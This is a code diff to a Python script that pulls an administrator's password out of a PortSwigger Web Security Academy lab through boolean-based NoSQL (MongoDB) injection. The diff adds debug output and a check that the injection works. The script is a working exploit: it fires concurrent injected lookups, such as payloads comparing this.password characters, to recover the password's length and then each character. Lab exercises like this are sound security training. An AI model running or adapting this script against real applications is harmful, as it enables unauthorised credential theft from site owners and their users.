@@ -5,6 +5,7 @@ Extracts administrator password via boolean-based MongoDB injection.
 
 Usage:
     python3 nosql_extract.py <LAB_URL>
+    python3 nosql_extract.py <LAB_URL> --debug     ← see raw responses
 
 Author: Yami05 | https://github.com/YAMI05-05
 Lab   : https://portswigger.net/web-security/nosql-injection
@@ -22,6 +23,7 @@ CREDS       = ("wiener", "peter")
 CHARSET     = string.ascii_lowercase
 MAX_LEN     = 30
 CONCURRENCY = 20
+DEBUG       = "--debug" in sys.argv
 
 
 # ── Helpers ────────────────────────────────────────────────────────────────────
@@ -44,22 +46,45 @@ async def login(session: aiohttp.ClientSession, user: str, pwd: str) -> bool:
         return "Log out" in await r.text()
 
 
-async def inject(session: aiohttp.ClientSession, sem: asyncio.Semaphore, payload: str) -> bool:
+async def inject(session: aiohttp.ClientSession, sem: asyncio.Semaphore, payload: str) -> tuple[bool, str]:
+    """Returns (user_found, raw_html)."""
     async with sem:
         async with session.get(
             f"{LAB_URL}/user/lookup?user={quote(payload)}", ssl=False
         ) as r:
-            soup = BeautifulSoup(await r.text(), "html.parser")
-            return not bool(soup.find("p", string=lambda t: t and "Could not find" in t))
+            html = await r.text()
+            soup = BeautifulSoup(html, "html.parser")
+            body = soup.get_text(" ", strip=True).lower()
+            found = "could not find" not in body and "error" not in body[:300].lower()
+            return found, html
+
+
+async def check(session: aiohttp.ClientSession, sem: asyncio.Semaphore, payload: str) -> bool:
+    found, html = await inject(session, sem, payload)
+    if DEBUG:
+        print(f"\n[DEBUG] payload : {payload}")
+        print(f"[DEBUG] found   : {found}")
+        print(f"[DEBUG] snippet : {html[:400]}\n")
+    return found
 
 
 # ── Core ───────────────────────────────────────────────────────────────────────
 async def find_length(session: aiohttp.ClientSession, sem: asyncio.Semaphore) -> int:
     print("[*] Finding password length...")
 
-    # Fire all checks concurrently: true condition = password length == n
+    # Verify injection works at all: known-true vs known-false
+    true_resp  = await check(session, sem, "administrator' && '1'=='1")
+    false_resp = await check(session, sem, "administrator' && '1'=='2")
+
+    if DEBUG:
+        print(f"[DEBUG] true condition  → found={true_resp}")
+        print(f"[DEBUG] false condition → found={false_resp}")
+
+    if true_resp == false_resp:
+        sys.exit("[-] Boolean injection not working — responses are identical")
+
     tasks = {
-        n: asyncio.create_task(inject(
+        n: asyncio.create_task(check(
             session, sem,
             f"administrator' && this.password.length == {n} || 'a'=='b"
         ))
@@ -79,7 +104,7 @@ async def extract_password(session: aiohttp.ClientSession, sem: asyncio.Semaphor
     print(f"[*] Extracting password ({length * len(CHARSET)} requests)...")
 
     tasks = {
-        (i, c): asyncio.create_task(inject(
+        (i, c): asyncio.create_task(check(
             session, sem,
             f"administrator' && this.password[{i}]=='{c}"
         ))
@@ -122,9 +147,10 @@ async def main():
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        sys.exit("Usage: python3 nosql_extract.py <LAB_URL>")
-    LAB_URL = sys.argv[1].rstrip("/")
+    args = [a for a in sys.argv[1:] if not a.startswith("--")]
+    if not args:
+        sys.exit("Usage: python3 nosql_extract.py <LAB_URL> [--debug]")
+    LAB_URL = args[0].rstrip("/")
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
